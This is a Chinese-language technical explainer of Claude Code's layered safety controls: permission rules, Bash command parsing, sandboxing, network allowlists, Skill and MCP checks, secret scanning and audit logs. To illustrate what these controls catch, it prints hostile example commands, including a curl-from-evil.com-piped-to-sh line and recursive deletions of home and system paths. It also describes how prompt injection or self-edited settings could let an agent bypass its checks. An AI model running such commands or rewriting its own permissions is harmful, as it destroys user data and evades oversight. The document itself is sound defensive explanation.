# Claude Code 安全机制解析

> 基于 `/Users/minruiqing/MyProjects/claude-code-rev` restored 代码树阅读整理。重点解释当前 Claude Code 在 tool 调用、Bash 执行、文件写入、沙箱、Skill、团队记忆等方面做了哪些安全机制。

---

## 目录

1. [总体安全模型](#1-总体安全模型)
2. [Tool 输入校验](#2-tool-输入校验)
3. [文件读写安全](#3-文件读写安全)
4. [权限系统](#4-权限系统)
5. [Bash 命令安全](#5-bash-命令安全)
6. [沙箱机制](#6-沙箱机制)
7. [网络访问限制](#7-网络访问限制)
8. [Skill 安全](#8-skill-安全)
9. [Team Memory 安全](#9-team-memory-安全)
10. [MCP 与 Hook 安全](#10-mcp-与-hook-安全)
11. [审计与 Telemetry](#11-审计与-telemetry)
12. [面试表达](#12-面试表达)

---

## 1. 总体安全模型

Claude Code 的安全边界不是 prompt，而是围绕工具执行建立的多层控制面。

模型不能直接操作宿主机。模型只能生成结构化 tool call，例如：

```json
{
  "tool": "Bash",
  "input": {
    "command": "git status"
  }
}
```

这个 tool call 在真正执行前会经过多层处理：

```text
模型输出 tool_use
  -> zod schema 校验
  -> tool.validateInput 自校验
  -> PreToolUse hooks
  -> 权限规则 deny / ask / allow
  -> tool-specific permission check
  -> auto mode classifier / 用户确认
  -> sandbox 包裹子进程
  -> 执行
  -> 输出处理、审计、telemetry
```

因此，即使模型被 prompt injection 诱导，它也只能“请求”执行某个动作，不能直接绕过权限系统和 sandbox。

关键文件：

- `src/services/tools/toolExecution.ts`
- `src/utils/permissions/permissions.ts`
- `src/tools/BashTool/bashPermissions.ts`
- `src/utils/sandbox/sandbox-adapter.ts`

---

## 2. Tool 输入校验

### 2.1 Schema 校验

每个 tool 都有 `inputSchema`，通常是 zod schema。执行前先调用：

```ts
tool.inputSchema.safeParse(input)
```

如果模型生成的参数类型不对、字段缺失、字段多余，就返回 `InputValidationError`，不会进入执行阶段。

例如 BashTool 的输入 schema 是严格对象：

```ts
{
  command: string
  timeout?: number
  description?: string
  run_in_background?: boolean
  dangerouslyDisableSandbox?: boolean
}
```

很多 tool 使用 `z.strictObject`，这能防止模型偷偷传额外字段。

### 2.2 Tool 自校验 validateInput

schema 只验证“形状对不对”，`validateInput` 进一步验证“这个请求在当前状态下是否合理”。

例子：

- FileEdit：`old_string === new_string` 拒绝，因为没有实际修改。
- FileEdit：`old_string` 在文件里找不到，拒绝，因为不知道改哪里。
- FileEdit：匹配多处但 `replace_all=false`，拒绝，因为目标不唯一。
- FileEdit：`.ipynb` 文件要求使用 NotebookEdit。
- FileWrite/FileEdit：team memory 文件写入前扫 secret。
- FileWrite/FileEdit：已存在文件必须先读再写，避免覆盖用户未读内容。
- SkillTool：Skill 必须在当前可用命令列表或远程 discovery state 中存在。

这类校验不是权限判断，而是 tool 自己的业务不变量检查。

### 2.3 `_simulatedSedEdit`

`_simulatedSedEdit` 是 BashTool 的内部字段，用来安全处理 `sed -i` 类文件编辑。

普通 `sed -i` 的问题是：用户在权限弹窗里看到的 diff，和 shell 实际执行后的结果可能因为 sed 方言、转义、换行、编码而不一致。

Claude Code 的做法是：

1. 解析 Bash 命令，识别这是 sed 文件编辑。
2. 权限 UI 先模拟出修改后的 `newContent`，展示 diff。
3. 用户确认后，把 `{ filePath, newContent }` 写入内部字段 `_simulatedSedEdit`。
4. BashTool 执行时看到该字段，不再跑真实 sed，而是直接把预览过的内容写入文件。

好处是：用户看到的 diff 和实际写入内容一致。

安全点：

- `_simulatedSedEdit` 不暴露给模型。
- model-facing schema 会 omit 这个字段。
- toolExecution 里还会防御性移除模型输入里的 `_simulatedSedEdit`。

否则模型可能构造一个看似安全的 Bash 命令，再通过 `_simulatedSedEdit` 偷偷写任意文件。

---

## 3. 文件读写安全

### 3.1 必须先读再写

Claude Code 用 `readFileState` 维护“文件已读快照表”。

FileRead 成功后记录：

```ts
readFileState.set(fullFilePath, {
  content,
  timestamp: mtimeMs,
  offset,
  limit,
})
```

FileEdit/FileWrite 写已存在文件前检查：

```ts
const readTimestamp = toolUseContext.readFileState.get(fullFilePath)
```

如果没有记录，或者只读了部分内容，就拒绝写入，提示先 Read。

原因：agent 必须基于当前文件内容修改，不能在没看过文件的情况下盲写。

### 3.2 防止 stale write

只“读过”还不够。Claude Code 还会检查文件从上次读到现在是否被别人改过：

```text
当前文件 mtime > readFileState.timestamp -> 文件可能已变化 -> 要求重新读
```

典型场景：

- 用户刚手动改了文件。
- formatter/linter 改了文件。
- 另一个 agent 改了文件。
- watcher 或构建工具生成了文件。

如果 agent 用旧内容继续写，可能覆盖用户改动。因此 CC 会拒绝并要求重新读。

更严谨的是：它不仅在 `validateInput` 阶段检查，真正写入前还会在 `call()` 内再检查一次，减少 TOCTOU 问题，即“检查之后、写入之前文件又变了”。

### 3.3 写入 settings 和敏感路径

对 `.claude/settings`、managed settings、`.claude/skills` 等目录，CC 会有额外限制。

原因是这些文件会影响 agent 后续行为：

- settings 可以改变权限模式。
- skills 可以注入未来上下文和工具行为。
- hooks 可以影响工具执行前后逻辑。

如果 agent 能随意写这些地方，就可能先修改自己的规则，再绕过安全限制。

---

## 4. 权限系统

Claude Code 的通用权限模型是：

```text
deny / ask / allow + permission mode + tool-specific checkPermissions
```

### 4.1 基本决策顺序

一次 tool 权限判断大致如下：

1. 整个 tool 是否被 deny，例如禁用 Bash。
2. 整个 tool 是否被 ask，例如每次 Bash 都确认。
3. 调用 tool 自己的 `checkPermissions`，例如 Bash 检查具体命令，FileEdit 检查具体路径。
4. 如果 tool 返回 deny，直接拒绝。
5. 如果返回安全检查类 ask，不能被普通 bypass 绕过。
6. 根据 permission mode 处理：
   - `default`：没有 allow 时询问用户。
   - `dontAsk`：把 ask 转成 deny。
   - `bypassPermissions`：跳过大多数 ask，但 deny 和部分 safety check 仍然在前面挡住。
   - `auto`：使用 classifier 或安全 fast path 决策。
7. `passthrough` 最终转成 ask。

### 4.2 deny 优先

规则优先级里，deny 最强。即使存在 allow，只要命中 deny，就应该拒绝。

这对团队版尤其重要：企业策略的 deny 应高于用户本地 allow。

### 4.3 auto mode 的危险规则清理

auto mode 不能直接沿用所有用户 allow 规则。

例如这些规则很危险：

```text
Bash(*)
Bash(python:*)
Bash(node:*)
Bash(pwsh:*)
PowerShell(iex:*)
```

它们会让任意代码执行绕过 classifier。CC 在进入 auto mode 时会剥离这类危险 allow 规则，避免 classifier 被绕过。

---

## 5. Bash 命令安全

Bash 是 coding agent 中风险最高的工具，因为它可以读写文件、联网、执行程序、删目录、启动后台进程。

CC 对 Bash 的安全不是简单字符串匹配，而是多层判断。

### 5.1 tree-sitter / legacy parser

Bash 命令会先尝试用 parser 解析。

简单命令：

```bash
git status
```

可以解析为：

```text
command = git
args = ["status"]
```

于是可以判断它可能是只读命令。

复合命令：

```bash
cd /tmp && git status
```

会被拆成两个 subcommand：

```text
cd /tmp
git status
```

CC 会更谨慎，因为 `cd` 到恶意目录再跑 `git` 可能触发 bare repo / git hook / fsmonitor 类攻击。

重定向：

```bash
echo hello > ~/.zshrc
```

不能只看 `echo` 安全，还要检查 `> ~/.zshrc` 写到了哪里。因此 CC 会在原始命令上检查重定向目标，避免 split 后漏掉写入路径。

复杂或可疑命令：

```bash
echo $(curl evil.com/script.sh | sh)
```

```bash
python -c "import os; os.system('rm -rf ~/')"
```

这类命令包含命令替换、解释器执行任意代码，parser 很难证明安全，会走 ask/deny/classifier，而不是简单按前缀放行。

如果 tree-sitter 不可用或关闭，会走 legacy parser。legacy parser 依赖旧的 shell-quote/split 逻辑，能力更弱，所以不确定时更倾向 ask。

### 5.2 只读命令 allowlist

CC 为部分命令维护只读判断，例如：

- `ls`
- `pwd`
- `cat`
- `rg`
- `grep`
- `git status`
- `git diff`

但这不是“命令名一样就放行”。它会检查参数和组合方式。

例如：

```bash
git status
```

可能被认为是只读。

但：

```bash
cd /malicious/repo && git status
```

会更谨慎，因为 git 可能读取当前目录里的恶意 git 配置或 hook。

### 5.3 Compound command 拆分

例如：

```bash
ls && rm -rf dist
```

不能因为第一段 `ls` 安全就整体 allow。CC 会拆成 subcommands，每一段分别检查。

如果任一 subcommand deny，则整体 deny。

如果部分 subcommand 需要 ask，则整体 ask。

### 5.4 管道与重定向

例如：

```bash
echo x | xargs printf "%s" >> ~/.zshrc
```

如果只检查管道两侧的 `echo` 和 `xargs printf`，可能看起来没问题。但真正危险的是 `>> ~/.zshrc`。

CC 会对原始命令继续做 path/redirection 检查，避免这种绕过。

### 5.5 危险删除路径

对 `rm`、`rmdir`，CC 会抽取路径并检查是否是危险路径。

例如：

```bash
rm -rf /
rm -rf ~
rm -rf ~/.ssh
rm -rf /System
```

这类操作会触发 ask，并且不建议保存成可复用 allow 规则。

### 5.6 命令注入与解析差异

CC 特别关注“parser 看到的命令”和 shell 实际执行的命令不一致的情况。

例如：

- 反引号
- `$()`
- heredoc
- 特殊换行
- 被引号隐藏的操作符
- 重定向目标中的命令替换

这类情况如果不能静态安全解析，就会要求人工确认或交给 classifier。

---

## 6. 沙箱机制

### 6.1 沙箱是什么

沙箱不是“把整个 CC 进程关在一个目录里”。更准确地说：

> CC 把 settings 和权限规则转换成 sandbox runtime config，然后在执行 Bash/PowerShell 等子进程命令时，用 sandbox runtime 包住该命令，让子进程在受限环境中运行。

因此，sandbox 主要保护的是子进程执行能力，尤其是 Bash。

内置 FileRead/FileEdit/FileWrite 更多依赖 app 层权限校验，不完全等同于 OS sandbox。

### 6.2 沙箱配置包含什么

主要包括：

- `allowRead`：允许读取的路径。
- `denyRead`：禁止读取的路径。
- `allowWrite`：允许写入的路径。
- `denyWrite`：禁止写入的路径。
- `allowedDomains`：允许访问的网络域名。
- `deniedDomains`：禁止访问的网络域名。
- unix socket、local binding、proxy 等网络选项。

默认会允许写：

- 当前工作目录。
- Claude 临时目录。
- 通过 `--add-dir` 或设置额外加入的目录。
- 某些 git worktree 必需路径。

默认会拒绝写：

- Claude settings 文件。
- managed settings drop-in 目录。
- `.claude/skills`。
- 一些 bare git repo 关键路径。

### 6.3 防止修改 agent 自身能力

禁写 settings 和 skills 是关键设计。

如果 agent 可以写：

```text
.claude/settings.json
.claude/settings.local.json
.claude/skills/**
```

它就可能：

- 给自己加 `Bash(*)`。
- 降低权限模式。
- 注入恶意 Skill。
- 修改未来会话的系统行为。

因此 CC 在 sandbox 层把这些路径加入 `denyWrite`。

### 6.4 Git 相关逃逸防护

Git 是一个高风险点，因为很多 git 命令看似只读，但 git 可能读取配置、hook、fsmonitor 等。

CC 做了几类处理：

- `cd + git` 的 compound command 要求进一步权限检查。
- 如果当前目录看起来像 bare git repo，会拒绝自动视作只读。
- 命令如果写入 git internal path 后又跑 git，会要求权限检查。
- sandbox adapter 会对 `HEAD`、`objects`、`refs`、`hooks`、`config` 等路径做 denyWrite 或命令后 scrub。

### 6.5 沙箱不可用时

sandbox 是否启用取决于：

- 平台是否支持：macOS、Linux、WSL2。
- 依赖是否存在：Linux/WSL 下可能需要 bubblewrap、socat。
- settings 是否启用。
- 企业策略是否要求。

如果用户明确启用 sandbox 但依赖缺失，CC 会给出不可用原因。团队版里，如果策略要求 sandbox，则 sandbox 不可用时应该 fail closed。

---

## 7. 网络访问限制

### 7.1 普通网络限制

sandbox network config 可以配置：

- allowed domains
- denied domains
- 是否允许 unix socket
- 是否允许 local binding
- proxy

这样可以限制 Bash/curl/npm 等子进程访问任意外网。

### 7.2 managed policy 锁死网络

managed policy 是管理员下发的企业策略。

例如管理员设置：

```text
sandbox.network.allowedDomains = ["github.com", "*.baidu-int.com"]
sandbox.network.allowManagedDomainsOnly = true
```

含义是：只能访问管理员 allowlist 中的域名。

用户本地不能自己把下面这些域名加入 allowlist：

```text
evil.com
pastebin.com
unknown-mcp-server.com
```

如果 `allowManagedDomainsOnly` 开启，即使 runtime 遇到未知网络请求，也不能弹窗让用户临时批准，而是直接拒绝。

这能防止 prompt injection 诱导 agent 把代码、日志、token、环境信息发到外部域名。

---

## 8. Skill 安全

### 8.1 Skill 必须已注册或已发现

SkillTool 不能执行模型随便编的名字。

本地/项目/managed/plugin/bundled Skill：

- 扫描 skill 目录，例如 `.claude/skills/<skill-name>/SKILL.md`。
- 解析 frontmatter 和正文。
- 生成一个 command-like entry。
- 放入当前可用 commands 列表。
- SkillTool 执行前用 `findCommand(skillName, commands)` 查找。
- 找不到就返回 `Unknown skill`。

MCP Skill：

- 从 `AppState.mcp.commands` 里取。
- 只允许 `type === 'prompt' && loadedFrom === 'mcp'` 的 MCP skill。
- 普通 MCP prompt 不能靠猜名字通过 SkillTool 调用。

远程 Skill：

- 使用 `_canonical_<slug>` 形式。
- 必须先在当前 session 的 remote skill discovery state 中存在。
- 否则报错：`Remote skill ... was not discovered in this session`。

因此，“必须已发现”的意思是：Skill 名字必须存在于当前 session 可用 Skill/Command 注册表；远程 Skill 还必须存在于当前 session 的 discovery state。

### 8.2 Skill 不能隐式扩大权限

Skill 可能声明：

- `allowedTools`
- `model`
- `effort`
- `executionContext: fork`
- `disableModelInvocation`

但 Skill 的 `allowedTools` 应理解为“Skill 可用工具上限”，不是直接绕过全局权限。

SkillTool 自己也走权限系统：

- deny 规则优先。
- allow 规则命中才直接放行。
- safe properties 才能自动 allow。
- 否则默认 ask。

### 8.3 远程/MCP Skill 风险

远程 Skill 和 MCP Skill 的风险更高，因为它们来源不完全在本地仓库内。

安全原则：

- 远程 Skill 不应该执行未审计 shell inline command。
- MCP server 必须有 allowlist。
- MCP tool 也要走权限判断。
- Skill 调用和后续工具调用都要进入 audit/telemetry。

---

## 9. Team Memory 安全

Team Memory 是团队共享记忆。如果 agent 把 secret 写进去，可能同步给仓库协作者。

因此 CC 在 FileWrite/FileEdit 的 `validateInput` 里调用 `checkTeamMemSecrets`。

流程：

```text
准备写文件
  -> 判断路径是否属于 team memory
  -> 如果不是，跳过
  -> 如果是，对内容 scanForSecrets
  -> 发现 secret，拒绝写入
```

扫描目标包括：

- API key
- cloud credentials
- GitHub/GitLab token
- OpenAI/Anthropic token
- Slack/Twilio/SendGrid token
- NPM/PyPI token
- Stripe/Shopify token

安全意义：防止敏感信息从个人机器扩散到团队共享记忆。

---

## 10. MCP 与 Hook 安全

### 10.1 MCP 安全点

MCP 扩展了 agent 的工具边界，所以必须纳入权限系统。

CC 中企业策略可以配置：

- `allowedMcpServers`
- `deniedMcpServers`
- `allowManagedMcpServersOnly`

含义：

- denied server 永远拒绝。
- 如果开启 managed-only，用户仍可本地配置 MCP，但真正可用 server 必须在管理员 allowlist 中。
- MCP tool 名称也会进入 permission rule 匹配。

团队版 coding agent 里，MCP 是高风险入口，因为它可能访问数据库、内网服务、CI/CD、工单系统。

### 10.2 Hook 安全点

Hook 可以在工具执行前后运行：

- PreToolUse
- PermissionRequest
- PostToolUse
- Stop hooks

它们可以做：

- DLP 检查。
- 高风险命令拦截。
- 审批转发。
- 记录外部审计。
- 修改 tool input。

但 hook 自身也有风险。因此企业策略里需要：

- managed hooks only。
- HTTP hook URL allowlist。
- hook 可用环境变量 allowlist。

否则恶意 hook 可能成为数据外传通道。

---

## 11. 审计与 Telemetry

### 11.1 审计是什么

审计 audit 关注安全、合规和追责。

它回答：

- 谁执行了动作？
- 在哪个项目和仓库？
- 调用了什么 tool？
- 输入是什么？
- 权限决策是什么？
- 命中了哪条规则？
- 用户是否批准？
- 最终修改了什么？

示例：

```json
{
  "type": "tool_decision",
  "userId": "u_123",
  "toolName": "Bash",
  "command": "rm -rf dist",
  "decision": "ask",
  "reason": "destructive command",
  "policyVersion": "2026-04-08-v3"
}
```

团队版中，审计日志用于安全回放、责任归因、合规检查、事故调查。

### 11.2 Telemetry 是什么

Telemetry 更关注产品质量、性能和运行指标。

它回答：

- Bash 平均耗时是多少？
- sandbox 拦截了多少次？
- auto classifier 成本是多少？
- 哪些 tool error rate 高？
- Skill 命中率如何？
- 哪些 Skill 失败率高？
- token/cost 消耗是否超预算？

示例：

```json
{
  "type": "skill_used",
  "skillName": "review-pr",
  "latencyMs": 8300,
  "toolErrorCount": 1,
  "testsPassed": true
}
```

审计偏“这次动作是否安全可追责”，telemetry 偏“系统整体是否好用、稳定、便宜”。

---

## 12. 面试表达

可以这样表达 Claude Code 的安全机制：

> Claude Code 的安全不是靠 prompt 告诉模型“不要乱来”，而是把模型输出限制为结构化 tool call，然后在执行前做 schema 校验、tool 自校验、PreToolUse hook、deny/ask/allow 权限判断、Bash 语义解析、auto classifier、sandbox OS 级隔离和审计记录。模型只能请求能力，不能直接拥有能力。

进一步展开：

- 对文件写入，它要求先读再写，并用 mtime/readFileState 防 stale write。
- 对 Bash，它不只做字符串匹配，而是 parser 解析、subcommand 拆分、只读 allowlist、重定向检查、危险路径检查、命令注入检查。
- 对 sandbox，它把文件和网络访问范围从 settings/policy 转换为 runtime config，包住 Bash/PowerShell 子进程。
- 对企业场景，managed policy 可以锁死网络域名、MCP server、hooks、权限规则，防止用户本地配置绕过组织安全策略。
- 对 Skill，它要求 Skill 已注册或远程已发现，并且 Skill 调用本身也走权限系统。
- 对 team memory，它在写入前扫 secret，防止凭据扩散给团队协作者。
- 对团队产品，审计和 telemetry 是必要能力：前者用于安全追责，后者用于质量优化和成本控制。

一句话总结：

> 个人版 coding agent 主要追求能完成任务；团队版 coding agent 必须在完成任务的同时，保证每个工具动作可限制、可审批、可审计、可回放。

